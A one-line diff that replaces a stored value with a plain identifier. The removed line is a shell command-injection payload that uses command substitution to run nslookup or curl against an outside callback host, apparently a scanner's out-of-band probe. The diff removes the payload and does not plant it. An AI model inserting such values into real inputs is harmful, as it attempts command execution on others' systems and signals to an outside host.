@@ -1,1 +1,1 @@
-$(nslookup -q=cname hitudybksmlwmec616.bxss.me||curl hitudybksmlwmec616.bxss.me)
+MO_286137913440_000
